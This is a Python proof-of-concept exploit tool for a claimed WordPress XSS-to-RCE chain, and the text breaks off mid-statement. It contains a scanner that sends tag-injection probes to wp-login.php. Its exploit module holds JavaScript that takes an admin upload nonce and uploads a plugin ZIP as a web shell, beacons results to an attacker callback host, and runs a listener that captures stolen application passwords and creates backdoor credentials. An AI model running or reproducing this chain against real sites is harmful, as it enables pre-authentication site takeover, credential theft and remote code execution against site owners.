#!/usr/bin/env python3
"""
XSS2Shell-PoC.py — CVE-2026-64638: XSS2Shell Proof-of-Concept — Whitebox Pentesting
==================================================================
Whitebox Pentesting Tool. Authorized Use ONLY on Assets You Own.

Based on pwn.ai Research: https://pwn.ai/blog/xss2shell

Chain (pwn.ai-faithful):
  1. strip_tags() Bypass via "< area>" (Space Before Tag Name)
  2. KSES Re-Parses as Valid <area>
  3. DOM Elements Injected into wp-login.php Error Message
  4. user-profile.js Auto-Clicks Injected .wp-generate-pw Button
  5. DOM Clobbering: <area id=ajaxurl> Controls $.post() URL
  6. REST JSONP Callback Fires -> XSS (Pre-Auth) [_jsonp=alert proof]
  7. STAGE-2 RCE (pwn.ai Flow, --rce):
     a. Injected ajaxurl Navigates Admin to authorize-application.php
     b. auth-app.js + Opener-Chain Click -> Application Password Created
     c. Password Redirected to Attacker Listener /callback
     d. Basic Auth -> Publish Page with unfiltered_html <script>
     e. Published JS (Admin Origin): Fetch Upload Nonce -> Plugin ZIP
        Upload -> Activate -> Web Shell -> SHELL_OK

CVE: 2026-64638 (WordPress 7.0 - 7.0.2)
References:
  https://pwn.ai/blog/xss2shell
  https://github.com/Boreas37/CVE-2026-64638-PoC

Requirements:
    pip install requests colorama beautifulsoup4

Exit codes: 0 = Not Vulnerable / Clean, 1 = Operational Error,
            2 = Vulnerability or RCE Confirmed
"""

import argparse
import base64
import io
import json
import random
import re
import socket
import string
import sys
import threading
import time
import urllib.parse
from pathlib import Path
import uuid
import zipfile
from http.server import HTTPServer, BaseHTTPRequestHandler

import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init(autoreset=True)

# ── Colors ─────────────────────────────────────────────────────────────
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
W = Style.RESET_ALL
BOLD = Style.BRIGHT

# ── Banner ─────────────────────────────────────────────────────────────
BANNER = """
░██    ░██   ░██████     ░██████    ░██████    ░██████   ░██                   ░██ ░██
 ░██  ░██   ░██   ░██   ░██   ░██  ░██   ░██  ░██   ░██  ░██                   ░██ ░██
  ░██░██   ░██         ░██               ░██ ░██         ░████████   ░███████  ░██ ░██
   ░███     ░████████   ░████████    ░█████   ░████████  ░██    ░██ ░██    ░██ ░██ ░██
  ░██░██           ░██         ░██  ░██              ░██ ░██    ░██ ░█████████ ░██ ░██
 ░██  ░██   ░██   ░██  ░██   ░██   ░██   ░██  ░██   ░██  ░██    ░██ ░██        ░██ ░██
░██    ░██   ░██████     ░██████   ░████████   ░██████   ░██    ░██  ░███████  ░██ ░██
"""


def norm(url: str) -> str:
    url = url.strip().rstrip('/')
    if not url.startswith('http'):
        url = 'https://' + url
    return url


def banner():
    print(BANNER)
    print(f"{Y}[!]{W} References: https://pwn.ai/blog/xss2shell | "
          f"https://github.com/Boreas37/CVE-2026-64638-PoC\n")


def log(msg, level='info'):
    colors = {'info': B, 'warn': Y, 'error': R, 'success': G, 'exploit': C}
    icons = {'info': '[*]', 'warn': '[!]', 'error': '[-]',
             'success': '[+]', 'exploit': '[>]'}
    prefix = time.strftime('%H:%M:%S')
    print(f"{colors.get(level, W)}{icons.get(level, '[*]')} [{prefix}] {msg}{W}")


def gen_token(length=12):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


EXIT_CLEAN = 0
EXIT_ERROR = 1
EXIT_VULN = 2

# persistent x2s-bait service capture log (used when the local
# listener port is busy and the systemd service does the capturing).
JSONL_CAPTURE_LOG_CANDIDATES = (
    Path('/root/x2s_captures.jsonl'),
    Path(__file__).resolve().parent / 'x2s_captures.jsonl',
)


class SessionThrottle:
    """Rate-limits failed-login POSTs to avoid triggering account lockout."""

    def __init__(self, seconds: float):
        self.seconds = max(0.0, seconds)
        self._last = 0.0

    def wait(self):
        if self.seconds <= 0:
            return
        delta = time.time() - self._last
        if delta < self.seconds:
            time.sleep(self.seconds - delta)
        self._last = time.time()


# ── Scanner Module ─────────────────────────────────────────────────────
class Scanner:
    """
    Scanner for CVE-2026-64638 XSS2Shell Conditions.

    Checks:
    1. WordPress Fingerprint
    2. WordPress Version (7.0-7.0.2 Vulnerable)
    3. wp-login.php Accessibility
    4. Error Message Reflection + HTML Escaping (DOM-Based, 3-State)
    5. strip_tags() -> KSES Parser Differential
    6. user-profile.js Loaded on wp-login.php (Evidence-Based Only)
    7. REST API Accessibility
    8. JSONP + _envelope Mechanism
    9. Anonymous REST Exposure
    10. Security Headers (CSP Eval-Blocking Analysis)
    """

    def __init__(self, base_url: str, timeout: int = 10, throttle: float = 1.5,
                 insecure: bool = False):
        self.base = base_url
        self.timeout = timeout
        self.throttle = SessionThrottle(throttle)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/131.0.0.0 Safari/537.36'
        })
        self.session.verify = not insecure
        self.findings = []
        self.results = {
            'target': base_url,
            'is_wordpress': False,
            'wp_version': None,
            'wp_patched': None,
            'wp_version_info': 'unknown',
            'wp_login_accessible': False,
            'error_message_reflection': False,
            'error_context': 'unknown',
            'html_escaping_active': None,   # tri-state: None = undetermined
            'strip_tags_bypass': False,
            'kses_allows_injection': False,
            'user_profile_js_loaded': False,
            'rest_api_accessible': False,
            'jsonp_works': False,
            'envelope_works': False,
            'anonymous_rest_exposed': None,
            'security_headers': {},
            'csp_blocks_eval': None,
            'vulnerable': False,
            'chain_complete': False,
        }

    def run(self):
        log(f"Starting XSS2Shell Scan: {self.base}", 'info')
        self.check_wordpress()
        self.check_wp_version()
        self.check_wp_login_accessible()
        self.check_error_message_reflection()
        self.check_strip_tags_bypass()
        self.check_user_profile_js()
        self.check_rest_api()
        self.check_jsonp_envelope()
        self.check_anonymous_rest()
        self.check_security_headers()
        self.evaluate()
        return self.results

    def _fetch(self, url, method='GET', **kwargs):
        try:
            kw = {'timeout': self.timeout, 'allow_redirects': True}
            kw.update(kwargs)
            r = self.session.request(method, url, **kw)
            return r
        except Exception as e:
            log(f"Request failed: {url} — {e}", 'error')
            return None

    def _login_post(self, username: str, password: str = 'wrongpassword123'):
        """POST to wp-login.php with Throttle."""
        self.throttle.wait()
        return self._fetch(
            f"{self.base}/wp-login.php",
            method='POST',
            data={
                'log': username,
                'pwd': password,
                'wp-submit': 'Log In',
                'redirect_to': '',
                'testcookie': '1'
            },
            allow_redirects=False
        )

    @staticmethod
    def _classify_escaping(html_text: str, token: str) -> dict:
        """
        Three-state escaping classification using BOTH source inspection
        and DOM parsing (per skill methodology).
        Returns {'state': escaped|sanitized|raw_html|absent, 'detail': str}
        """
        # State A: fully escaped entity
        if f"&lt;area id={token}&gt;" in html_text or \
           f"&lt;area id=&quot;{token}&quot;&gt;" in html_text:
            return {'state': 'escaped',
                    'detail': 'Tag Rendered as HTML Entities (&lt;area...)'}
        # State B: sanitized entirely
        if token not in html_text:
            return {'state': 'sanitized',
                    'detail': 'Probe Token Absent — Tags Stripped Entirely'}
        # State C: DOM-parse to see what the browser would build
        soup = BeautifulSoup(html_text, 'html.parser')
        el = soup.find(id=token)
        if el is not None:
            return {'state': 'raw_html',
                    'detail': f'<{el.name} id={token}> Parsed as REAL DOM Element'}
        # Token survived but not as element id — find context window
        idx = html_text.index(token)
        window = html_text[max(0, idx - 60):idx + 60]
        return {'state': 'escaped',
                'detail': f'Token Present as Text, Not Element: ...{window}...'}

    # ── Check 1: WordPress detection ────────────────────────────────────
    def check_wordpress(self):
        log("CHECK-1: WordPress Fingerprint...", 'info')
        r = self._fetch(self.base)
        indicators = []
        if r:
            indicators += [
                '/wp-content/' in r.text,
                '/wp-includes/' in r.text,
                '/wp-json/' in r.text,
                '/wp-login.php' in r.text,
                'wp-embed' in r.text,
            ]
        r_login = self._fetch(f"{self.base}/wp-login.php")
        if r_login and 'wp-login-logo' in r_login.text:
            indicators.append(True)

        self.results['is_wordpress'] = sum(bool(i) for i in indicators) >= 2
        if self.results['is_wordpress']:
            log("WordPress Detected ✓", 'success')
        else:
            log("WordPress Not Detected (Heavily Modified or Not WordPress)", 'warn')

    # ── Check 2: WordPress version ──────────────────────────────────────
    def check_wp_version(self):
        log("CHECK-2: WordPress Version (Vulnerable 7.0–7.0.2)...", 'info')

        version = None
        source = ''

        # Meta generator
        r = self._fetch(self.base)
        if r:
            m = re.search(
                r'<meta[^>]*name=["\']generator["\'][^>]*'
                r'content=["\']WordPress\s*([\d.]+)', r.text, re.I)
            if m:
                version = m.group(1)

        # Feed generator — matches both "?v=X.Y.Z" and bare forms
        if not version:
            r2 = self._fetch(f"{self.base}/feed/")
            if r2:
                m2 = re.search(
                    r'<generator>[^<]*wordpress\.org/[^<]*?v=([\d.]+)',
                    r2.text, re.I)
                if not m2:
                    m2 = re.search(
                        r'<generator>[^<]*wordpress\.org/?([\d.]+)',
                        r2.text, re.I)
                if m2:
                    version = m2.group(1)
                    source = ' (feed)'

        self.results['wp_version'] = version
        if version:
            is_patched = self._version_ge(version, '7.0.3')
            self.results['wp_patched'] = is_patched
            parts = version.split('.')
            major = int(parts[0])
            minor = int(parts[1]) if len(parts) > 1 else 0

            if major < 7:
                log(f"WordPress {version}{source} — NOT IN VULNERABLE RANGE", 'warn')
                log("  CVE-2026-64638 Affects WordPress 7.0–7.0.2 Only", 'info')
                log(f"  WordPress {major}.{minor} Lacks Required Chain Components:", 'info')
                log("    - user-profile.js Not Loaded on wp-login.php", 'info')
                log("    - JSONP + _envelope Mechanism Unavailable", 'info')
                self.results['wp_version_info'] = 'below_vulnerable_range'
            elif is_patched:
                log(f"WordPress {version}{source} — PATCHED ✓", 'success')
                self.results['wp_version_info'] = 'patched'
            else:
                log(f"WordPress {version}{source} — VULNERABLE", 'error')
                self.results['wp_version_info'] = 'vulnerable'
        else:
            log("Version Not Detected via Passive Methods", 'warn')
            self.results['wp_patched'] = None
            self.results['wp_version_info'] = 'unknown'

    @staticmethod
    def _version_ge(v1: str, v2: str) -> bool:
        try:
            p1 = [int(x) for x in v1.split('.')[:3]]
            p2 = [int(x) for x in v2.split('.')[:3]]
            while len(p1) < 3:
                p1.append(0)
            while len(p2) < 3:
                p2.append(0)
            return p1 >= p2
        except (ValueError, AttributeError):
            return False

    # ── Check 3: wp-login.php accessible ────────────────────────────────
    def check_wp_login_accessible(self):
        log("CHECK-3: wp-login.php Accessibility...", 'info')
        r = self._fetch(f"{self.base}/wp-login.php")
        if r and r.status_code in [200, 302]:
            self.results['wp_login_accessible'] = True
            log("wp-login.php Accessible ✓", 'success')
        else:
            log("wp-login.php Not Accessible (Blocked or Moved)", 'warn')

    # ── Check 4: Error reflection + HTML escaping (DOM-based) ───────────
    def check_error_message_reflection(self):
        log("CHECK-4: Error Message Reflection + HTML Escaping...", 'info')

        probe = gen_token(16)
        r = self._login_post(probe)
        if not r:
            log("Failed to Reach wp-login.php", 'error')
            return

        if probe in r.text:
            self.results['error_message_reflection'] = True
            log(f"Error Message Reflects Username '{probe}' ✓", 'success')
            soup = BeautifulSoup(r.text, 'html.parser')
            error_div = soup.find(id='login_error') or \
                        soup.find('div', class_='message')
            if error_div and probe in str(error_div):
                log("Username Reflected in Login Error div ✓", 'success')
        else:
            log("Username NOT Reflected in Error Message", 'warn')
            return

        # HTML escaping probe — DOM-classified
        log("  Checking HTML Escaping Behavior (DOM Analysis)...", 'info')
        html_probe = gen_token(10)
        r2 = self._login_post(f'<area id={html_probe}>')
        if not r2:
            return

        verdict = self._classify_escaping(r2.text, html_probe)
        state = verdict['state']
        detail = verdict['detail']

        if state == 'raw_html':
            self.results['error_context'] = 'raw_html'
            self.results['html_escaping_active'] = False
            log("  ✓ No HTML Escaping — Probe Parsed as Real DOM Element", 'warn')
            log(f"    {detail}", 'info')
            self.findings.append({
                'type': 'critical',
                'test': 'no_html_escaping',
                'detail': detail,
                'impact': 'Injected Tags Render as DOM — Chain Step Available'
            })
        elif state == 'escaped':
            self.results['error_context'] = 'escaped'
            self.results['html_escaping_active'] = True
            log(f"  ⚠️ HTML Escaping ACTIVE — {detail}", 'warn')
            log("  ❌ XSS Chain BROKEN: Browser Sees Text, Not Elements", 'error')
            self.findings.append({
                'type': 'info',
                'test': 'html_escaping',
                'detail': detail,
                'impact': 'Chain Neutralized — Tags Are Escaped Before Rendering'
            })
        elif state == 'sanitized':
            self.results['error_context'] = 'sanitized'
            self.results['html_escaping_active'] = True
            log("  Input Sanitized (HTML Removed Entirely) — Chain Blocked", 'warn')
        else:
            self.results['error_context'] = 'absent'
            log("  Probe Token Vanished — Aggressive Sanitization/WAF", 'warn')

    # ── Check 5: strip_tags() -> KSES parser differential ───────────────
    def check_strip_tags_bypass(self):
        log("CHECK-5: strip_tags() → KSES Parser Differential...", 'info')

        probe = gen_token(8)
        # Both unterminated (space-prefix trick) and terminated variants
        test_payloads = [
            f'< area id={probe}>',
            f'< area id={probe}',
            f'< div id={probe}>',
            f'< map id={probe}>',
        ]

        for payload in test_payloads:
            r = self._login_post(payload)
            if not r:
                continue

            if probe not in r.text:
                continue

            verdict = self._classify_escaping(r.text, probe)

            if verdict['state'] == 'raw_html':
                soup = BeautifulSoup(r.text, 'html.parser')
                el = soup.find(id=probe)
                tag_name = el.name if el else '?'
                self.results['strip_tags_bypass'] = True
                self.results['kses_allows_injection'] = True
                log(f"Parser Differential CONFIRMED: '{payload.strip()}' "
                    f"→ Parsed as <{tag_name}>", 'error')
                self.findings.append({
                    'type': 'critical',
                    'test': 'strip_tags_bypass',
                    'detail': f"'{payload.strip()}' Survived strip_tags() and "
                              f"KSES Emitted <{tag_name} id={probe}>",
                    'impact': 'DOM Injection Possible via Login Error Messages'
                })
                return
            elif verdict['state'] == 'escaped':
                if not self.results['html_escaping_active']:
                    self.results['html_escaping_active'] = True
                    self.results['error_context'] = 'escaped'
                log(f"  Payload Survives PHP but is HTML-Escaped: "
                    f"{verdict['detail'][:90]}", 'warn')

        if not self.results['strip_tags_bypass']:
            if self.results['wp_patched'] is True:
                log("WordPress 7.0.3+ Detected — Parser Differential Patched",
                    'success')
            elif self.results['wp_version'] and \
                    self._version_ge(self.results['wp_version'], '5.0'):
                log("WP 5.0+ — KSES preg_replace May Handle Whitespace "
                    "differently", 'warn')
            log("Parser Differential Not Confirmed via Automated Test", 'warn')

    # ── Check 6: user-profile.js (evidence-based only) ──────────────────
    def check_user_profile_js(self):
        log("CHECK-6: user-profile.js on wp-login.php...", 'info')
        r = self._fetch(f"{self.base}/wp-login.php")
        if not r:
            return

        # Direct evidence: script src or load marker
        if re.search(r'user-profile(\.min)?\.js', r.text):
            self.results['user_profile_js_loaded'] = True
            log("user-profile.js Enqueued on wp-login.php ✓", 'success')
        elif "'user-profile'" in r.text or '"user-profile"' in r.text:
            self.results['user_profile_js_loaded'] = True
            log("user-profile.js Handle Referenced ✓", 'success')
        else:
            log("user-profile.js NOT Found on wp-login.php", 'warn')
            log("  Chain Trigger Unavailable Unless Script Loads "
                "Conditionally", 'info')

        # Structural context (informational only, does NOT flip result)
        soup = BeautifulSoup(r.text, 'html.parser')
        for sel_id, sel_cls in [('color-picker', 'reset-pass-submit')]:
            has_cp = soup.find(id=sel_id) is not None
            has_rp = soup.find(class_=sel_cls) is not None
            log(f"  #{sel_id}: {'present' if has_cp else 'Absent (Expected)'}",
                'info')
            log(f"  .{sel_cls}: {'present' if has_rp else 'Absent (Expected)'}",
                'info')

    # ── Check 7: REST API ───────────────────────────────────────────────
    def check_rest_api(self):
        log("CHECK-7: REST API Accessibility...", 'info')
        r = self._fetch(f"{self.base}/wp-json/")
        if r and r.status_code == 200:
            self.results['rest_api_accessible'] = True
            log("REST API Publicly Accessible ✓", 'success')
            try:
                data = r.json()
                routes = list(data.get('routes', {}).keys()) \
                    if isinstance(data, dict) else []
                log(f"REST API Routes: {len(routes)}", 'info')
                interesting = [
                    rt for rt in routes
                    if any(k in rt for k in (
                        'wp/v2/users', 'wp/v2/plugins', 'wp/v2/settings',
                        'graphql', 'acf', 'elementor', 'woocommerce'))
                ]
                if interesting:
                    log(f"Interesting Routes: {interesting[:6]}", 'warn')
            except (json.JSONDecodeError, ValueError):
                log("REST Index Returned Non-JSON", 'warn')
        else:
            status = r.status_code if r else 'unreachable'
            log(f"REST API Not Accessible (Status: {status})", 'warn')

    # ── Check 8: JSONP + _envelope ──────────────────────────────────────
    def check_jsonp_envelope(self):
        log("CHECK-8: JSONP + _envelope Mechanism...", 'info')
        probe = gen_token(12)

        url1 = f"{self.base}/wp-json/?_jsonp={probe}"
        r1 = self._fetch(url1)
        if r1:
            ct = r1.headers.get('Content-Type', '')
            if 'javascript' in ct:
                self.results['jsonp_works'] = True
                log("JSONP Returns Application/JavaScript ✓", 'success')
                if re.search(rf'{re.escape(probe)}\s*\(', r1.text):
                    log(f"Callback '{probe}(…)' Pattern Confirmed ✓", 'success')
            else:
                log(f"JSONP Content-Type: {ct or 'none'}", 'warn')

        url2 = f"{self.base}/?rest_route=/&_jsonp={probe}&_envelope=1"
        r2 = self._fetch(url2)
        if r2:
            ct = r2.headers.get('Content-Type', '')
            if 'javascript' in ct or \
                    re.search(rf'{re.escape(probe)}\s*\(', r2.text):
                self.results['envelope_works'] = True
                log(f"JSONP + _envelope Works ✓ (Status: {r2.status_code})",
                    'success')
                if re.search(rf'{re.escape(probe)}\s*\(', r2.text):
                    log("Callback Pattern Confirmed ✓", 'success')
            else:
                log(f"JSONP + _envelope: Unexpected Content-Type ({ct})",
                    'warn')

        if not self.results['jsonp_works'] and \
                not self.results['envelope_works']:
            log("JSONP Mechanism Not Confirmed", 'warn')

    # ── Check 9: Anonymous REST exposure ────────────────────────────────
    def check_anonymous_rest(self):
        log("CHECK-9: Anonymous REST Access...", 'info')
        r = self._fetch(f"{self.base}/wp-json/wp/v2/settings")
        if r and r.status_code == 200:
            self.results['anonymous_rest_exposed'] = True
            log("⚠️ wp/v2/settings Readable ANONYMOUSLY (Info Leak) ✓", 'warn')
            self.findings.append({
                'type': 'medium',
                'test': 'anonymous_settings_read',
                'detail': 'GET /wp-json/wp/v2/settings Returns 200 Unauthenticated',
                'impact': 'Site Metadata Exposed; Hardening Recommended'
            })
        elif r and r.status_code == 401:
            self.results['anonymous_rest_exposed'] = False
            log("REST Auth Required for Settings (401) — Normal ✓", 'success')
            log("  Note: JSONP eval() May Still Fire on 401 Envelopes", 'info')
        elif r:
            self.results['anonymous_rest_exposed'] = None
            log(f"REST Anonymous Check Inconclusive (Status {r.status_code})",
                'info')

    # ── Check 10: Security headers ──────────────────────────────────────
    def check_security_headers(self):
        log("CHECK-10: Security Headers...", 'info')
        r = self._fetch(f"{self.base}/wp-login.php")
        if not r:
            return

        headers_to_check = [
            'X-Content-Type-Options', 'X-Frame-Options',
            'Content-Security-Policy', 'X-XSS-Protection',
            'Strict-Transport-Security', 'Referrer-Policy',
        ]
        for header in headers_to_check:
            value = r.headers.get(header, '')
            present = bool(value)
            self.results['security_headers'][header] = {
                'present': present,
                'value': value if present else 'MISSING'
            }
            icon = '✓' if present else '✗'
            shown = value[:50] if present else 'MISSING'
            log(f"  [{icon}] {header}: {shown}",
                'success' if present else 'info')

        csp = r.headers.get('Content-Security-Policy', '')
        if not csp:
            self.results['csp_blocks_eval'] = False
            log("  ⚠️ No CSP — eval()/JSONP Chain NOT Blocked", 'warn')
        else:
            has_script_src = 'script-src' in csp or 'default-src' in csp
            allows_unsafe = ('unsafe-inline' in csp or 'unsafe-eval' in csp
                             or '*' in csp.replace('*.', ''))
            blocks = has_script_src and not allows_unsafe
            self.results['csp_blocks_eval'] = blocks
            if blocks:
                log("  ✓ CSP Present and Blocks eval()", 'success')
            elif 'frame-ancestors' in csp and not has_script_src:
                log("  ⚠️ CSP Only Frame-Ancestors — Does NOT Block eval()",
                    'warn')
            else:
                log(f"  ⚠️ CSP Present but Permissive: {csp[:80]}", 'warn')

    # ── Evaluation ──────────────────────────────────────────────────────
    def evaluate(self):
        log("Evaluating XSS2Shell Chain Conditions...", 'info')

        # The exploit vector uses SPACE-PREFIXED tags. If the DOM-confirmed
        # differential exists, escaping of plain tags is irrelevant — the
        # injected elements render regardless.
        esc_active = bool(self.results['html_escaping_active'])
        differential_renders = (self.results['strip_tags_bypass'] and
                                self.results['kses_allows_injection'])
        esc_blocks = esc_active and not differential_renders

        conditions = {
            'WordPress Detected': self.results['is_wordpress'],
            'wp-login.php Accessible': self.results['wp_login_accessible'],
            'Error Message Reflection':
                self.results['error_message_reflection'],
            'Injection Renders as DOM (CRITICAL)': not esc_blocks,
            'strip_tags() Bypass': self.results['strip_tags_bypass'],
            'user-profile.js Loaded (Evidence)':
                self.results['user_profile_js_loaded'],
            'REST API Accessible': self.results['rest_api_accessible'],
            'JSONP Works': self.results['jsonp_works']
                           or self.results['envelope_works'],
            'No Eval-Blocking CSP':
                self.results['csp_blocks_eval'] is False,
        }
        for name, met in conditions.items():
            icon = '✓' if met else '✗'
            log(f"  [{icon}] {name}", 'success' if met else 'warn')

        core_chain = (
            self.results['error_message_reflection'] and
            self.results['strip_tags_bypass'] and
            not esc_blocks and
            self.results['user_profile_js_loaded'] and
            (self.results['jsonp_works'] or self.results['envelope_works'])
        )
        full_chain = core_chain and self.results['rest_api_accessible']

        self.results['chain_complete'] = full_chain
        self.results['vulnerable'] = full_chain or core_chain

        if self.results['wp_patched']:
            log("  🟢 PATCHED: WordPress 7.0.3+ — Vulnerability Fixed", 'success')
            self.results['vulnerable'] = False
        elif differential_renders:
            # Space-prefixed injection confirmed rendering as DOM —
            # plain-tag escaping does not stop the exploit vector.
            log("  🔴 VULNERABLE: Space-Prefixed Injection Renders as DOM "
                "(Differential Beats Escaping)", 'error')
        elif esc_active and self.results['strip_tags_bypass']:
            log("  🟡 PARTIAL: Parser Differential Exists but HTML Escaping "
                "Blocks Exploitation", 'warn')
            self.results['vulnerable'] = False
        elif full_chain:
            log("  🔴 VULNERABLE: Complete XSS2Shell Chain Confirmed", 'error')
        elif core_chain:
            log("  🟠 VULNERABLE: Core Chain Conditions Met "
                "(REST Unverified)", 'error')
        elif self.results['strip_tags_bypass']:
            log("  🟡 PARTIAL: Parser Differential Detected, "
                "Incomplete Chain", 'warn')
            self.results['vulnerable'] = False
        else:
            log("  🟢 NOT VULNERABLE: Chain Conditions Not Met", 'success')


# ── Exploit Module ─────────────────────────────────────────────────────────────
ATTACKER_PAGE_JS = r"""(async function(){
  var CB = '__CB__';
  function rep(t,o){ try { new Image().src = CB+'/log?t='+encodeURIComponent(t)+'&d='+encodeURIComponent(JSON.stringify(o)).substring(0,1400); } catch(e){} }
  try {
    // Step 5 of pwn.ai flow: fetch upload form nonce from ADMIN origin
    const html = await fetch('/wp-admin/update.php?action=upload-plugin', {credentials:'include'}).then(function(r){return r.text();});
    const m = html.match(/name="_wpnonce" value="([^"]+)"/);
    if (!m) { rep('NONCE_MISSING', {}); return; }
    const nonce = m[1];
    rep('NONCE_OK', {nonce: nonce.substring(0,10)+'...'});

    // Build plugin ZIP client-side from embedded base64
    const b64 = '__ZIP_B64__';
    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i=0;i<bin.length;i++) bytes[i] = bin.charCodeAt(i);
    const blob = new Blob([bytes], {type:'application/zip'});

    const fd = new FormData();
    fd.append('_wpnonce', nonce);
    fd.append('_http_referer', '/wp-admin/plugin-install.php?tab=upload');
    fd.append('action', 'upload-plugin');
    fd.append('pluginzip', blob, 'x2s-pivot.zip');

    const res = await fetch('/wp-admin/update.php?action=upload-plugin', {
      method:'POST', credentials:'include', body: fd
    });
    rep('PLUGIN_UPLOADED', {status: res.status});
    // Plugin auto-activates on successful upload; shell is web-accessible.
    rep('DONE', {});
  } catch(e) { rep('err', {m:String(e)}); }
})();"""


class ExploitServer(BaseHTTPRequestHandler):
    """Mini HTTP Server Receiving XSS/RCE Beacons + Attacker Pages."""
    callback_data = []
    app_password_capture = None   # dict when /callback fires
    shell_confirmed = False
    static = {}                   # path -> (content_type, body)

    def log_message(self, fmt, *args):  # silence stderr spam
        pass

    def _record(self):
        try:
            parsed = urllib.parse.urlparse(self.path)
            params = urllib.parse.parse_qs(parsed.query)
            rec = {
                'path': parsed.path,
                'params': params,
                'headers': dict(self.headers),
                'time': time.strftime('%H:%M:%S'),
            }
            ExploitServer.callback_data.append(rec)

            # App-password capture route (pwn.ai step 3)
            if parsed.path == '/callback' and params.get('password'):
                cap = {
                    'site_url': params.get('site_url', [''])[0],
                    'user_login': params.get('user_login', [''])[0],
                    'password': params.get('password', [''])[0],
                }
                ExploitServer.app_password_capture = cap
                log(f"BEACON[APP_PASSWORD_CAPTURED] user="
                    f"{cap['user_login']} pwd={cap['password']}", 'exploit')
                return

            # Static pages served by us are NOT beacons — label clearly
            if parsed.path in ('/bait', '/payload', '/selftest', '/probe',
                               '/attacker', '/attacker.js'):
                log(f"HTTP {parsed.path} fetched by client "
                    f"({dict(self.headers).get('User-Agent','?')[:60]})",
                    'info')
                return

            tag = params.get('t', ['hit'])[0]
            blob = params.get('d', [''])[0]
            log(f"BEACON[{tag}] {blob[:160]}", 'exploit')
            if tag == 'SHELL_OK':
                ExploitServer.shell_confirmed = True
        except Exception as e:
            log(f"Beacon parse error: {e}", 'error')

    def _respond(self):
        try:
            parsed = urllib.parse.urlparse(self.path)
            # Static attacker pages
            if parsed.path in ExploitServer.static:
                ctype, body = ExploitServer.static[parsed.path]
                self.send_response(200)
                self.send_header('Content-Type', ctype)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(body)
                return
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'// ok')
        except Exception:
            pass

    def do_GET(self):
        self._record()
        self._respond()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0) or 0)
        if length:
            try:
                body = self.rfile.read(length)[:4000].decode('utf-8', 'replace')
                if ExploitServer.callback_data:
                    ExploitServer.callback_data[-1]['body'] = body
                log(f"  body: {body[:200]}", 'exploit')
            except Exception:
                pass
        self.do_GET()


class Exploit:
    """
    XSS2Shell Exploit — pwn.ai Faithful Stages.

    Modes:
      --proof : Reference payload (_jsonp=alert), Execution Evidence Only.
      default : STAGE-2 Armed (Legacy Inline-JS Probe; Kept for Beacon
                Telemetry but Inline-JS is Dropped by WordPress _jsonp Validation).
      --rce   : FULL pwn.ai Flow:
          1. Injected <area id=ajaxurl> href -> authorize-application.php
          2. Admin Approves via auth-app.js (Opener-Chain Auto-Click by
             Attacker Callback Page; Manual Click Also Works)
          3. App Password Redirects to Listener /callback
          4. Basic Auth -> Publish Page Embedding Attacker JS (unfiltered_html)
          5. Navigate Victim/Admin to That Page -> JS Uploads Plugin ZIP
             via wp-admin Nonce -> Web Shell Live -> SHELL_OK
    """

    BACKDOOR_PREFIX = 'x2s_svc_'

    def __init__(self, base_url: str, callback_port: int = 8888,
                 callback_host: str = None, timeout_wait: int = 15,
                 insecure: bool = False, proof_mode: bool = False,
                 rce_mode: bool = False):
        self.base = base_url
        self.callback_port = callback_port
        self.wait_seconds = timeout_wait
        self.proof_mode = proof_mode
        self.rce_mode = rce_mode
        self.session = requests.Session()
        self.session.verify = not insecure
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                          'AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/131.0.0.0 Safari/537.36'
        })

        if self.proof_mode and not callback_host:
            # --xss/--proof is fully offline — no IP detection.
            self.callback_host = '127.0.0.1'
        elif callback_host:
            self.callback_host = callback_host
        else:
            # Prefer the LOCAL ROUTING source address (the NIC IP that
            # actually receives inbound traffic). ipify can report an ISP
            # NAT-pool egress IP that is NOT routable back to this host.
            detected = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(5)
                s.connect(('8.8.8.8', 53))
                detected = s.getsockname()[0]
                s.close()
            except Exception:
                pass
            if not detected or detected.startswith('10.') or \
                    detected.startswith('192.168.') or \
                    detected.startswith('172.'):
                # Private/route failed — fall back to ipify
                try:
                    detected = requests.get('https://api.ipify.org',
                                            timeout=8).text.strip()
                except Exception as e:
                    raise SystemExit(
                        f"[-] Cannot Detect Public IP ({e}).\n"
                        f"    Pass --host <YOUR_PUBLIC_IP> Explicitly.")
            if not re.match(r'^\d+\.\d+\.\d+\.\d+$', detected):
                raise SystemExit(
                    f"[-] Bogus Detected IP {detected!r}.\n"
                    f"    Pass --host <YOUR_PUBLIC_IP> Explicitly.")
            self.callback_host = detected
            log(f"Callback Host Detected: {self.callback_host}", 'info')

        # Resolved in run() AFTER the listener is up.
        self.callback_url = None
        self.backdoor_user = None
        self.backdoor_pass = None
        self.no_pivot = False
        self._rce_app_id = None
        self._run_started_str = time.strftime('%Y-%m-%d %H:%M:%S')

    # ── Stage orchestration ────────────────────────────────────────────
    def run(self):
        log("Starting XSS2Shell Exploit Chain...", 'exploit')
        self._run_started_str = time.strftime('%Y-%m-%d %H:%M:%S')

        if self.proof_mode:
            # --xss/--proof is fully offline: no listener, no
            # callback URL, no selftest, no wait, no VM-bait push.
            self.callback_url = '(proof mode: no callback)'
            log("Proof Mode — Offline: No Listener / Callback / IP "
                "Detection Required.", 'info')
        else:
            self._start_listener()
            self._resolve_callback_url()
            log(f"Callback URL: {self.callback_url}", 'info')
            if not self._selftest_listener():
                log("Listener NOT Reachable — Callbacks Cannot Arrive.",
                    'error')
                return EXIT_ERROR

        self._gen_backdoor_creds()
        payload = self._build_xss_payload()
        if self.proof_mode:
            self._write_proof_artifacts(payload)
        else:
            self._write_bait_files(payload)
        mode_label = ('PROOF (Alert)' if self.proof_mode else
